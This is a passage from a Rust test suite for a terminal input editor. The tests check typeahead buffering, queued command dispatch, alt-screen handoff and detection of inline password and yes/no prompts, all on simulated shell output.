            LaneContent::Reconnecting
        );
        st.asleep = true;
        assert_eq!(lane_content(&st, false, false, false, now), LaneContent::Asleep);
        st.asleep = false;
        st.reconnecting = false;
    }

    // ── Post-submit typeahead buffering (the fast-typing fix) ─────────

    /// THE user scenario (screenshot: "again if i type to fast it breaks"):
    /// `lsdf⏎dfs⏎ds⏎f⏎` typed blind at 15+ chars/sec. The first Enter
    /// submits; the rest queue inside the window and dispatch ONE PER
    /// PROMPT CYCLE — four clean `❯` blocks, zero raw fall-through, zero
    /// chords, zero flushes, Compose (the editor) held throughout.
    #[test]
    fn blind_triple_submit_executes_as_clean_sequential_blocks() {
        let recs: Vec<BlockRec> = Vec::new();
        let mut t = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t), Some(5));

        st.draft = "lsdf".into();
        let (bytes, _) = st.submit(&b, cover_line_for(&st, &b, true, t), Some("C:\\"));
        assert_eq!(bytes, b"lsdf\r");
        assert!(st.buffering());
        for cmd in ["dfs", "ds", "f"] {
            // The Enter path while buffering (EnterAction::Queue): the
            // typed draft becomes a queued blind submission.
            st.draft = cmd.into();
            st.queue_draft();
        }
        assert_eq!(st.pending.len(), 3);

        let mut executed = vec![b"lsdf\r".to_vec()];
        for n in 0..8u32 {
            // The shell answers the last dispatched command: exec + echo +
            // scroll + fresh prompt (pre ahead of its text — ConPTY order).
            let last = executed.last().unwrap();
            let cmd = String::from_utf8(last[..last.len() - 1].to_vec()).unwrap();
            let mut d = hook_bytes("exec", &format!(r#"{{"c":"{cmd}"}}"#));
            d.extend_from_slice(cmd.as_bytes());
            d.extend_from_slice(b"\r\n");
            d.extend(hook_bytes("pre", &format!(r#"{{"e":1,"n":{},"d":"C:"}}"#, n + 2)));
            d.extend_from_slice(b"PS C:\\> ");
            d.extend_from_slice(b"\x1b]133;B\x07");
            b.advance_live(&d);
            t += Duration::from_millis(80); // realistic round-trip pace
            let _ = sim_frame(&mut st, &mut b, &recs, t);
            assert_eq!(st.mode, ComposerMode::Compose, "the editor is never yielded");
            assert!(
                st.take_pending_clear().is_none(),
                "clean fast typing: no chord, no flush, ever"
            );
            if let Some((bytes, spacer)) =
                st.pump_pending(&b, cover_line_for(&st, &b, true, t), Some("C:\\"), t)
            {
                assert!(!spacer);
                executed.push(bytes);
            }
            if executed.len() == 4 && !st.buffering() && st.submit_hold.is_none() {
                break;
            }
        }
        assert_eq!(
            executed,
            vec![
                b"lsdf\r".to_vec(),
                b"dfs\r".to_vec(),
                b"ds\r".to_vec(),
                b"f\r".to_vec()
            ],
            "one command per prompt cycle, in typed order"
        );
        // Four clean ❯ blocks: a history cover per command, all on distinct
        // rows, each row really carrying its echo (no raw `PS …>` remains).
        let covers = b.healthy_covers();
        let mut lines: Vec<i32> = covers
            .iter()
            .filter(|c| c.cmd.is_some())
            .map(|c| c.line)
            .collect();
        assert_eq!(lines.len(), 4, "every blind command got its ❯ cover");
        lines.sort_unstable();
        lines.dedup();
        assert_eq!(lines.len(), 4, "no two covers stacked on one row");
        for c in covers.iter().filter(|c| c.cmd.is_some()) {
            assert!(
                b.row_has_text_at(c.line, c.col, c.cmd.as_deref().unwrap()),
                "cover at {} sits on the row that shows its echo",
                c.line
            );
        }
    }

    /// Disambiguation rule (a): the submitted command flips to alt-screen
    /// (the `claude` case) — the buffered keys belong to the APP. They flush
    /// to the PTY in order within the SAME tick as the flip, and the
    /// composer yields raw.
    #[test]
    fn alt_flip_flushes_buffer_to_app_same_tick() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "claude".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        // Typed during the window — held in the draft, NOT at the shell.
        st.draft = "hello".into();

        // claude starts: exec, echo, then the alt-screen flip.
        let mut d = hook_bytes("exec", r#"{"c":"claude"}"#);
        d.extend_from_slice(b"claude\r\n\x1b[?1049h");
        b.advance_live(&d);
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, false, now + Duration::from_millis(60));

        assert_eq!(st.mode, ComposerMode::Raw(RawReason::AltScreen));
        assert_eq!(
            st.take_pending_clear().as_deref(),
            Some(b"hello".as_ref()),
            "buffered keys reach the app in the flip's own tick"
        );
        assert!(st.draft.is_empty(), "flushed, not duplicated");
    }

    /// Rule (b), REWRITTEN DELIBERATELY for the permanent editor (this test
    /// used to pin the 300ms flush+yield — the measured re-arm gap): no
    /// fresh prompt within POST_SUBMIT_FLUSH means the command is
    /// long-running (`ping -n 3`) — the WINDOW closes but the editor STAYS,
    /// typed text keeps buffering visibly in the draft, and NOTHING flushes
    /// raw. Enter then queues; the queued command fires at the prompt-byte
    /// via pump_pending.
    #[test]
    fn busy_threshold_holds_compose_and_buffers_typing() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "ping -n 3 localhost".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        let mut d = hook_bytes("exec", r#"{"c":"ping -n 3 localhost"}"#);
        d.extend_from_slice(b"ping -n 3 localhost\r\nPinging...\r\n");
        b.advance_live(&d);
        pump_counters(&mut st, &b, now);
        st.draft = "dfs".into(); // typed during the ping

        // Inside the threshold: still buffering.
        st.tick(&b, &recs, true, false, now + POST_SUBMIT_FLUSH - Duration::from_millis(10));
        assert_eq!(st.mode, ComposerMode::Compose);
        assert!(st.take_pending_clear().is_none());
        assert_eq!(st.draft, "dfs");

        // Past it: window closed, Compose HELD, zero bytes, draft intact —
        // the editor never leaves (box-away time = 0).
        st.tick(&b, &recs, true, false, now + POST_SUBMIT_FLUSH + Duration::from_millis(10));
        assert_eq!(st.mode, ComposerMode::Compose, "the editor never yields on the threshold");
        assert!(st.take_pending_clear().is_none(), "no raw flush, ever");
        assert_eq!(st.draft, "dfs", "typing stays visible in the draft");
        assert!(!st.buffering(), "the window itself is closed");

        // Enter now queues (busy_hold routing); the queued command fires the
        // frame the fresh prompt certifies clean — the prompt-byte.
        st.queue_draft();
        assert!(st.pump_pending(&b, None, Some("C:\\"), now + Duration::from_secs(1)).is_none(),
            "never dispatches into the running command");
        let mut d = b"\r\ndone\r\n".to_vec();
        d.extend(hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        d.extend_from_slice(b"PS C:\\> ");
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        let t2 = now + Duration::from_secs(2);
        pump_counters(&mut st, &b, t2);
        st.tick(&b, &recs, true, false, t2);
        let (bytes, spacer) = st
            .pump_pending(&b, None, Some("C:\\"), t2)
            .expect("queued submission fires at the clean fresh prompt");
        assert_eq!(bytes, b"dfs\r");
        assert!(!spacer);
    }

    /// An EMPTY buffer at the threshold (nothing typed since Enter),
    /// REWRITTEN DELIBERATELY for the permanent editor (used to pin the
    /// yield to Raw(Busy)): the window closes with zero bytes and the
    /// editor stays — lane_content remains Editor for the whole run.
    #[test]
    fn empty_window_expires_holding_compose() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "cargo build".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        let mut d = hook_bytes("exec", r#"{"c":"cargo build"}"#);
        d.extend_from_slice(b"cargo build\r\n   Compiling...\r\n");
        b.advance_live(&d);
        pump_counters(&mut st, &b, now);

        let late = now + POST_SUBMIT_FLUSH + Duration::from_millis(10);
        st.tick(&b, &recs, true, false, late);
        assert_eq!(st.mode, ComposerMode::Compose, "no yield at the threshold");
        assert!(st.take_pending_clear().is_none(), "no bytes for an empty buffer");
        assert!(!st.buffering());
        assert_eq!(
            lane_content(&st, true, false, true, late),
            LaneContent::Editor,
            "the strip lane stays the editor across the busy span"
        );
    }

    // ── Permanent editor (rearm-latency fix): zero box-away time ───────

    /// Submit-ready predicate, mirroring show()'s `can_submit` core (the
    /// measurement rig's definition).
    fn submit_ready(st: &ComposerState, b: &TermBackend, recs: &[BlockRec], now: Instant) -> bool {
        let i = st.gate_inputs(b, recs, true, now);
        st.mode == ComposerMode::Compose
            && i.running
            && !i.alt
            && !i.open_block
            && i.at_prompt
            && !st.buffering()
    }

    /// THE latency assertion (permanence truth table, lanes B/D of the
    /// measurement rig on simulated clocks): across a submit → slow command
    /// → fresh prompt cycle, `lane_content` is Editor at EVERY frame (box-
    /// away time = 0ms) and submit-ready returns within one 4ms frame of
    /// the 133;B prompt-byte feed.
    #[test]
    fn editor_never_leaves_across_submit_cycle() {
        // Lane B: integrated, 1.2s command (the measured 945ms hidden span).
        let recs: Vec<BlockRec> = Vec::new();
        let t0 = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t0), Some(5));
        st.draft = "npm run build".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));

        let mut exec = hook_bytes("exec", r#"{"c":"npm run build"}"#);
        exec.extend_from_slice(b"npm run build\r\n");
        let mut prompt = hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#);
        prompt.extend_from_slice(b"PS C:\\> ");
        let mut schedule: Vec<(u64, Vec<u8>)> = vec![
            (20, exec),
            (300, b"building...\r\n".to_vec()),
            (1200, b"done\r\n".to_vec()),
            (1230, prompt),
            (1245, b"\x1b]133;B\x07".to_vec()),
        ];
        let mut fed = 0usize;
        let mut ready_at: Option<u64> = None;
        for el in (0..=1500u64).step_by(4) {
            let now = t0 + Duration::from_millis(el);
            while fed < schedule.len() && schedule[fed].0 <= el {
                let bytes = std::mem::take(&mut schedule[fed].1);
                b.advance_live(&bytes);
                pump_counters(&mut st, &b, now);
                fed += 1;
            }
            let _ = sim_frame(&mut st, &mut b, &recs, now);
            assert_eq!(
                lane_content(&st, true, false, false, now),
                LaneContent::Editor,
                "lane must be Editor at every frame (t=+{el}ms)"
            );
            if ready_at.is_none() && el > 0 && submit_ready(&st, &b, &recs, now) {
                ready_at = Some(el);
            }
        }
        let ready = ready_at.expect("submit-ready must return");
        // Ready returns at the PRE byte (+1230): the box is already Compose,
        // so the pre latch alone re-enables Enter — an Enter landing in the
        // pre→133;B render window QUEUES and pump-dispatches on the 133;B
        // frame (Bug 1a, pinned by window_submit_queues_then_converts_via_
        // pump), so nothing can fire before the prompt-byte certifies.
        assert!(
            (1230..=1249).contains(&ready),
            "submit-ready within one frame of the prompt bytes, got +{ready}ms"
        );

        // Lane D: ssh, RTT 350ms > the old 300ms window (the measured 80ms
        // blink on EVERY submit) — the box must not blink at all.
        let t0 = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState {
            is_ssh: true,
            ..Default::default()
        };
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t0), Some(5));
        st.draft = "ls".into();
        let _ = st.submit(&b, Some(5), Some("~"));
        let mut exec = hook_bytes("exec", r#"{"c":"ls"}"#);
        exec.extend_from_slice(b"ls\r\nfile1\r\n");
        let mut prompt = hook_bytes("pre", r#"{"e":0,"n":2,"d":"~"}"#);
        prompt.extend_from_slice(b"PS C:\\> \x1b]133;B\x07");
        let mut schedule: Vec<(u64, Vec<u8>)> = vec![(350, exec), (380, prompt)];
        let mut fed = 0usize;
        let mut ready_at: Option<u64> = None;
        for el in (0..=600u64).step_by(4) {
            let now = t0 + Duration::from_millis(el);
            while fed < schedule.len() && schedule[fed].0 <= el {
                let bytes = std::mem::take(&mut schedule[fed].1);
                b.advance_live(&bytes);
                pump_counters(&mut st, &b, now);
                fed += 1;
            }
            let _ = sim_frame(&mut st, &mut b, &recs, now);
            assert_eq!(
                lane_content(&st, true, false, false, now),
                LaneContent::Editor,
                "ssh 350ms RTT: no per-submit blink (t=+{el}ms)"
            );
            if ready_at.is_none() && el > 0 && submit_ready(&st, &b, &recs, now) {
                ready_at = Some(el);
            }
        }
        let ready = ready_at.expect("ssh submit-ready must return");
        // The window close at +300ms re-exposes the still-latched prompt
        // (the exec is still on the wire at RTT 350) — submit-ready may
        // return as wire type-ahead before the prompt bytes; it must never
        // be LATER than one frame after them.
        assert!(
            ready <= 384,
            "ssh ready by one frame after the prompt bytes, got +{ready}ms"
        );
    }

    /// Lane F (heuristic nested shell, 1.5s inner command — the measured
    /// 821ms hidden span): Editor at every frame; the queue contract holds
    /// (a mid-run Enter fires at the fresh mint, not into the command).
    #[test]
    fn heur_editor_never_leaves_across_submit_cycle() {
        let (mut b, mut st, recs, t0) = heur_episode_setup();
        let t1 = t0 + HEUR_QUIET + Duration::from_millis(100);
        st.tick(&b, &recs, true, true, t1);
        assert_eq!(st.mode, ComposerMode::Compose);
        let cover = cover_line_for(&st, &b, true, t1);
        let _ = st.dispatch_submission(&b, cover, None, "apt update", t1);
        let _ = st.take_submit_cmd();

        let mut schedule: Vec<(u64, Vec<u8>)> = vec![
            (30, b"apt update\r\n".to_vec()),
            (700, b"Reading package lists...\r\n".to_vec()),
            (1500, b"Done\r\n".to_vec()),
            (1520, b"root@box:/# ".to_vec()),
        ];
        let mut fed = 0usize;
        let mut latch_was_down = false;
        let mut minted_at: Option<u64> = None;
        for el in (0..=2000u64).step_by(4) {
            let now = t1 + Duration::from_millis(el);
            while fed < schedule.len() && schedule[fed].0 <= el {
                let bytes = std::mem::take(&mut schedule[fed].1);
                b.advance_live(&bytes);
                fed += 1;
            }
            st.tick(&b, &recs, true, true, now);
            assert_eq!(
                lane_content(&st, true, false, true, now),
                LaneContent::Editor,
                "heuristic lane: the editor never leaves (t=+{el}ms)"
            );
            // The FRESH mint (the pre-submit latch is still live at el=0
            // until the echo tears it down at +30ms — skip it).
            if !st.heur_live(&b) {
                latch_was_down = true;
            } else if latch_was_down && minted_at.is_none() {
                minted_at = Some(el);
            }
        }
        let minted = minted_at.expect("fresh heuristic latch must mint");
        // Simulated-instant caveat: HEUR_QUIET reads the backend's real
        // output clock, so the walk can only pin "at/after the prompt
        // paints" here — the exact cmd-end+300ms remint timing is the
        // measurement rig's job (real clocks, staging).
        assert!(
            minted >= 1520,
            "re-mint only after the fresh nested prompt paints, got +{minted}ms"
        );
    }

    /// THE measured G-trap, structurally fixed: typing during a busy
    /// command lands in the (still present, still focused) draft — never
    /// raw — so the returning prompt is clean, the box never DEMOTEs into
    /// hidden-until-click (the rig measured "hidden FOREVER" here), and a
    /// mid-run Enter queues then fires at the prompt-byte.
    #[test]
    fn typed_during_busy_stays_in_draft() {
        let recs: Vec<BlockRec> = Vec::new();
        let t0 = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t0), Some(5));
        st.draft = "npm test".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));

        let mut exec = hook_bytes("exec", r#"{"c":"npm test"}"#);
        exec.extend_from_slice(b"npm test\r\n");
        b.advance_live(&exec);
        pump_counters(&mut st, &b, t0);

        // +600ms: the user types the next command — into the DRAFT (the
        // editor is present and focused; keys can no longer fall raw).
        let t_type = t0 + Duration::from_millis(600);
        st.tick(&b, &recs, true, true, t_type);
        assert_eq!(st.mode, ComposerMode::Compose, "box present while typing");
        st.draft = "git status".into();
        // …and presses Enter: queue (the busy_hold Enter routing).
        st.queue_draft();

        // Well past DEMOTE with the command still running: never demoted.
        let t_demote = t_type + DEMOTE + Duration::from_millis(100);
        st.tick(&b, &recs, true, true, t_demote);
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "typing during busy can never DEMOTE the box into hidden-until-click"
        );
        assert!(st.take_pending_clear().is_none(), "nothing leaks to the PTY");

        // The prompt returns CLEAN (no echoed type-ahead exists to dirty
        // it); the queued command fires at the prompt-byte frame.
        let mut d = b"ok\r\n".to_vec();
        d.extend(hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        d.extend_from_slice(b"PS C:\\> ");
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        let t_prompt = t0 + Duration::from_millis(1245);
        pump_counters(&mut st, &b, t_prompt);
        st.tick(&b, &recs, true, true, t_prompt);
        assert_eq!(st.mode, ComposerMode::Compose);
        let (bytes, spacer) = st
            .pump_pending(&b, None, Some("C:\\"), t_prompt)
            .expect("queued submission fires at the clean fresh prompt");
        assert_eq!(bytes, b"git status\r");
        assert!(!spacer);
        assert!(!st.episode_used || st.mode == ComposerMode::Compose, "no ManualOnly trap");
    }

    /// The no-demote pin: busy-Compose is DEMOTE-healthy through BOTH busy
    /// signals — an open block rec, and the feed-time exec→pre span
    /// (`busy_since`, covering the Blocks round-trip) — while the idle-
    /// prompt broken-cover case still demotes (the restored-render fix's
    /// reason to exist; pinned by compose_demotes_after_sustained_…).
    #[test]
    fn busy_compose_survives_demote_clock() {
        // Signal 1: busy_since alone (no rec mirrored yet — empty recs).
        let recs: Vec<BlockRec> = Vec::new();
        let t0 = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t0), Some(5));
        st.draft = "sleep 60".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        let mut exec = hook_bytes("exec", r#"{"c":"sleep 60"}"#);
        exec.extend_from_slice(b"sleep 60\r\n");
        b.advance_live(&exec);
        pump_counters(&mut st, &b, t0);
        st.tick(&b, &recs, true, true, t0 + DEMOTE + Duration::from_secs(5));
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "busy-by-latch-drop (busy_since) is a healthy Compose steady state"
        );

        // Signal 2: open block rec (the mirrored-recs shape).
        let open = vec![BlockRec {
            epoch: 1,
            n: 0,
            cmd: "sleep 60".into(),
            cwd: None,
            exit: None,
            started_ms: 0,
            ended_ms: None,
            start_off: 0,
            end_off: None,
            truncated: false,
        }];
        st.tick(&b, &open, true, true, t0 + DEMOTE + Duration::from_secs(10));
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "an open block is a healthy Compose steady state"
        );
    }

    /// The ONE remaining auto-yield: a password / y-n question printed by
    /// the RUNNING command on the cursor row steps the busy-Compose editor
    /// aside (keys belong to the program; echo may be off). Nothing fires —
    /// the queue folds into the visible draft — and the gate re-arms clean
    /// at the next fresh prompt.
    #[test]
    fn inline_prompt_yields_editor() {
        let recs: Vec<BlockRec> = Vec::new();
        let t0 = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t0), Some(5));
        st.draft = "sudo make install".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        let mut exec = hook_bytes("exec", r#"{"c":"sudo make install"}"#);
        exec.extend_from_slice(b"sudo make install\r\n");
        b.advance_live(&exec);
        pump_counters(&mut st, &b, t0);
        st.draft = "next cmd".into();
        st.queue_draft(); // a queued Enter that must NEVER blind-fire here

        // Ordinary output: the editor holds.
        b.advance_live(b"make: entering directory\r\n");
        st.tick(&b, &recs, true, true, t0 + Duration::from_millis(400));
        assert_eq!(st.mode, ComposerMode::Compose);

        // The command asks: the classifier yields the editor same frame.
        b.advance_live(b"[sudo] password for alec: ");
        st.tick(&b, &recs, true, true, t0 + Duration::from_millis(500));
        assert_eq!(
            st.mode,
            ComposerMode::Raw(RawReason::Busy),
            "editor steps aside for the inline password prompt"
        );
        assert!(st.take_pending_clear().is_none(), "nothing fires at a password");
        assert_eq!(st.draft, "next cmd", "queue folded into the visible draft");
        assert!(st.pending.is_empty());

        // The prompt returns: the gate re-arms clean (no trap).
        let mut d = b"\r\n".to_vec();
        d.extend(hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        d.extend_from_slice(b"PS C:\\> ");
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        let t1 = t0 + Duration::from_millis(900);
        pump_counters(&mut st, &b, t1);
        st.tick(&b, &recs, true, true, t1);
        assert_eq!(st.mode, ComposerMode::Compose, "re-arms at the fresh prompt");
    }

    /// Classifier fixtures for the inline-interactive auto-yield: password /
    /// passphrase / host-key / y-n confirm shapes match at the row END only;
    /// prompts, percentages, plain output and colons-without-keywords never
    /// match (a false positive is only ever the old always-yield behavior,
    /// but the negatives keep the permanent editor permanent).
    #[test]
    fn inline_interactive_prompt_table() {
        for row in [
            "Password:",
            "alec@box's password: ",
            "Enter passphrase for key '/home/a/.ssh/id_ed25519':",
            "[sudo] password for alec: ",
            "Are you sure you want to continue connecting (yes/no)?",
            "Are you sure you want to continue connecting (yes/no/[fingerprint])?",
            "Do you want to continue? [Y/n]",
            "Proceed with installation? (y/N)",
            "Replace existing file? (y/n): ",
            "Save changes [y/N]?",
        ] {
            assert!(inline_interactive_prompt(row), "must yield for {row:?}");
        }
        for row in [
            "PS C:\\> ",
            "root@box:/# ",
            "Compiling pulse v0.1.4",
            "progress: 100%",
            "Elapsed time: 00:01:",     // colon tail, no keyword
            "downloading... done",
            "echo hello world",
            "-- INSERT --",
            "",
        ] {
            assert!(!inline_interactive_prompt(row), "must hold for {row:?}");
        }
    }

    /// Busy typing through the REAL show() path (headless egui — the D2
    /// test pattern): with the window closed and the command still running
    /// (busy_hold), keys land in the draft with zero PTY bytes and Enter
    /// QUEUES — the permanence truth table's interactive leg.
    #[test]
    fn show_busy_types_and_queues_enter() {
        let recs: Vec<BlockRec> = Vec::new();
        let t0 = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t0), Some(5));
        st.draft = "cargo build".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        let mut exec = hook_bytes("exec", r#"{"c":"cargo build"}"#);
        exec.extend_from_slice(b"cargo build\r\n   Compiling...\r\n");
        b.advance_live(&exec);
        pump_counters(&mut st, &b, t0);
        // The threshold has passed: window closed, Compose held (what a
        // tick at +300ms does — set directly, show() uses the real clock).
        st.post_submit = None;
        st.submit_hold = None;
        assert!(!st.buffering());

        let ctx = egui::Context::default();
        let strip = Rect::from_min_max(Pos2::new(0.0, 564.0), Pos2::new(800.0, 600.0));
        let grid = Rect::from_min_max(Pos2::ZERO, Pos2::new(800.0, 564.0));
        let frame = |st: &mut ComposerState, b: &TermBackend, events: Vec<egui::Event>| {
            let raw = egui::RawInput {
                screen_rect: Some(Rect::from_min_max(Pos2::ZERO, Pos2::new(800.0, 600.0))),
                events,
                ..Default::default()
            };
            let mut out = None;
            let _ = ctx.run_ui(raw, |ctx| {
                egui::CentralPanel::default().show(ctx, |ui| {
                    out = Some(show(
                        ui,
                        strip,
                        grid,
                        Uuid::nil(),
                        st,
                        b,
                        &recs,
                        1,
                        true,
                        false,
                        false,
                        FontId::monospace(13.0),
                        None,
                        None,
                    ));
                });
            });
            let o = out.unwrap();
            st.has_focus = o.has_focus;
            o
        };
        // Frame 1: the busy editor holds egui focus.
        let o = frame(&mut st, &b, vec![]);
        assert!(o.has_focus, "busy editor must hold focus");
        assert_eq!(st.mode, ComposerMode::Compose);
        // Frame 2: typing lands in the draft — zero PTY bytes.
        let o = frame(&mut st, &b, vec![egui::Event::Text("git st".into())]);
        assert!(o.write.is_empty(), "keystrokes never go raw while busy");
        assert_eq!(st.draft, "git st");
        // Frame 3: Enter queues (busy_hold routing) — still zero bytes.
        let o = frame(
            &mut st,
            &b,
            vec![egui::Event::Key {
                key: Key::Enter,
                physical_key: None,
                pressed: true,
                repeat: false,
                modifiers: Modifiers::NONE,
            }],
        );
        assert!(o.write.is_empty(), "Enter during busy queues, never submits raw");
        assert_eq!(st.pending.len(), 1, "the draft became a queued submission");
        assert_eq!(st.pending[0], "git st");
        assert!(st.draft.is_empty());
        assert_eq!(st.mode, ComposerMode::Compose, "the box never leaves");
    }

    /// Production-faithful frame: on_stream_events + tick + drain the cover,
    /// THEN compute cover_line and pump ONE queued submission in the SAME
    /// frame (exactly central.rs' order — tick at :233, cover drain at :269,
    /// cover_line at :362, pump inside show at :3198), draining the pump's
    /// own cover. Returns the dispatched bytes, if any.
    fn prod_frame(
        st: &mut ComposerState,
        b: &mut TermBackend,
        recs: &[BlockRec],
        now: Instant,
    ) -> Option<Vec<u8>> {
        // Mirror central.rs order: resolve a pending prompt-end upgrade
        // (:220) BEFORE the tick/gate/pump read it.
        let _ = b.poll_pending_prompt_end(now);
        let f = b.block_feed.as_ref().unwrap();
        let (pre, exec) = (f.pre_seen, f.exec_seen);
        st.on_stream_events(pre, exec, now);
        st.tick(b, recs, true, true, now);
        if let Some((l, c, cwd, cmd)) = st.take_pending_history_cover() {
            b.add_history_cover(l, c, cwd, cmd);
        }
        let comp_active = st.mode == ComposerMode::Compose;
        let cl = cover_line_for(st, b, comp_active, now);
        st.pump_pending(b, cl, Some("C:\\"), now).map(|(bytes, _)| {
            if let Some((l, c, cwd, cmd)) = st.take_pending_history_cover() {
                b.add_history_cover(l, c, cwd, cmd);
            }
            bytes
        })
    }

    /// RAPID-FIRE REGRESSION (field: sandbox round 3 — Enter mashed on an
    /// ssh session left the scrollback flip-flopping between `❯ cwd ls`
    /// covers and raw `zany@host:~$ ls` prompt rows). Reproduces the ssh
    /// delivery shape the passing blind_triple test does NOT: the echo of a
    /// command and its completion prompt arrive in SEPARATE drains (RTT), so
    /// the queued dispatch fires the frame the prompt-byte lands — racing the
    /// just-closed block's cover mint. EVERY submitted command's prompt row
    /// must get its `❯ cwd cmd` cover regardless of dispatch timing: N
    /// back-to-back queued submits ⇒ N covered rows, zero raw leaks.
    #[test]
    fn rapid_fire_submits_every_row_covered() {
        const N: usize = 8;
        let recs: Vec<BlockRec> = Vec::new();
        let mut t = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t), Some(5));

        // Enter mashed: the first submits, the rest queue instantly (all
        // typed before any completes — the field gesture).
        st.draft = "ls".into();
        let (bytes, _) = st.submit(&b, cover_line_for(&st, &b, true, t), Some("C:\\"));
        assert_eq!(bytes, b"ls\r");
        for _ in 1..N {
            st.draft = "ls".into();
            st.queue_draft();
        }
        assert_eq!(st.pending.len(), N - 1);

        // Drive the shell one delivery-chunk at a time. The ssh shape:
        // Frame A: exec + echo (RTT) — NO prompt yet.
        // Frame B: output rows scroll.
        // Frame C: fresh pre + prompt text + 133;B (command done).
        // The queued dispatch fires in Frame C's own tick/pump.
        let mut done = 0usize;
        let mut n = 2u32;
        // `n` is a protocol sequence number that outlives early-break rounds,
        // not a loop counter (clippy 1.97+ flags the pattern).
        #[allow(clippy::explicit_counter_loop)]
        for _round in 0..(N * 6) {
            // Whatever command is live (just dispatched or the initial ls).
            // Frame A: exec OSC ahead of the echo (ConPTY reorder), then the
            // echoed command text — a separate drain from the prompt.
            b.advance_live(&hook_bytes("exec", r#"{"c":"ls"}"#));
            b.advance_live(b"ls\r\n");
            t += Duration::from_millis(4);
            let _ = prod_frame(&mut st, &mut b, &recs, t);

            // Frame B: a couple of output rows (the ls listing) scroll.
            b.advance_live(b"Documents  Downloads\r\nMusic  Public\r\n");
            t += Duration::from_millis(4);
            let _ = prod_frame(&mut st, &mut b, &recs, t);

            // Frame C: the completion prompt (pre ahead of its text — ConPTY
            // order — then 133;B). at_prompt latches clean HERE.
            let mut d = hook_bytes("pre", &format!(r#"{{"e":0,"n":{n},"d":"C:"}}"#));
            d.extend_from_slice(b"PS C:\\> ");
            d.extend_from_slice(b"\x1b]133;B\x07");
            b.advance_live(&d);
            n += 1;
            t += Duration::from_millis(4);
            let dispatched = prod_frame(&mut st, &mut b, &recs, t);
            if dispatched.is_some() {
                done += 1;
            }
            if !st.buffering() && st.submit_hold.is_none() && st.pending.is_empty() {
                // Let the last hold release + convert.
                for _ in 0..3 {
                    t += Duration::from_millis(4);
                    let _ = prod_frame(&mut st, &mut b, &recs, t);
                }
                break;
            }
        }

        // Every one of the N `ls` invocations must have a healthy `❯ ls`
        // history cover on a DISTINCT row — zero raw prompt leaks.
        let covers = b.healthy_covers();
        let cmd_covers: Vec<_> = covers.iter().filter(|c| c.cmd.is_some()).collect();
        let mut lines: Vec<i32> = cmd_covers.iter().map(|c| c.line).collect();
        lines.sort_unstable();
        lines.dedup();
        assert_eq!(
            (cmd_covers.len(), lines.len()),
            (N, N),
            "all {N} submitted rows must be covered on distinct rows (got {} covers, {} distinct); \
             a shortfall is the raw-prompt flip-flop leak",
            cmd_covers.len(),
            lines.len()
        );
        for c in &cmd_covers {
            assert!(
                b.row_has_text_at(c.line, c.col, "ls"),
                "cover at row {} must sit on a row that really shows its `ls` echo",
                c.line
            );
        }
        assert_eq!(done, N - 1, "all queued submits dispatched");
    }

    /// REORDER REPRO (the field flip-flop's real mechanism): conhost
    /// forwards the 133;B OSC AHEAD of its prompt text, so `prompt_end` is
    /// captured PROVISIONALLY at col 0 with the cursor also parked at col 0 —
    /// `cursor_at_prompt_end()` is briefly true there. With the permanent
    /// editor's immediate queued dispatch, pump fires in THAT window and pins
    /// the SubmitHold at col 0; the echo then lands at the real prompt-end
    /// col, so the conversion `row_has_text_at(row, 0, cmd)` fails and the row
    /// leaks raw. The fix: pump waits for the SETTLED prompt end.
    #[test]
    fn rapid_fire_reorder_no_raw_leak() {
        const N: usize = 6;
        let recs: Vec<BlockRec> = Vec::new();
        let mut t = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t), Some(5));
        st.draft = "ls".into();
